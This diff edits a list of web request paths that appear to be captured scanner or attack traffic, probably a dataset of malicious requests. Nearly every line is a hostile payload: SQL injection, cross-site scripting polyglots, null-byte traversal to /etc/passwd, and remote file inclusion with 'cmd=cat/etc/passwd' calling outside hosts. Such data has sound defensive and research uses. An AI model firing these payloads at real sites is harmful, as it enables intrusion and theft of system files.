@@ -1,11 +1,4 @@
-/forum.asp?n=/....../boot.ini|41|80040e14|[microsoft][odbc_sql_server_driver][sql_server]line_1:_incorrect_syntax_near_&#039;/&#039;.
-/examples/jsp/cal/calendar.php?month=' union select 1,1,'1331904431','calendarix_month_sql_injection.nasl',1 #
-/path0/path1/path2/path3/?payload=var data = "jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e";document.head.outerHTML = data;
-/javascript/htpasswd.exe
-/<script>cross_site_scripting.nasl</script>.idc
-/manager/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00
 /javascript/00.exe
-/javascript/.htaccess.sfish/"`false`"
-/path0/?payload=<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
-/phpmyadmin/documentation.html?phpmyadmin='"'");|]*{%0d%0a<%00>
-/gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/zz5thkvtmlgl?&cmd=cat/etc/passwd
+/javascript/htpasswd.exe
+/gepi/gestion/savebackup.php?filename=http://192.168.202.96:8080/4dckqcc0acprbz?&cmd=cat/etc/passwd
+/gepi/gestion/savebackup.php?filename=http://192.168.202.118:8080/2aibfaczmac8?&cmd=cat/etc/passwd
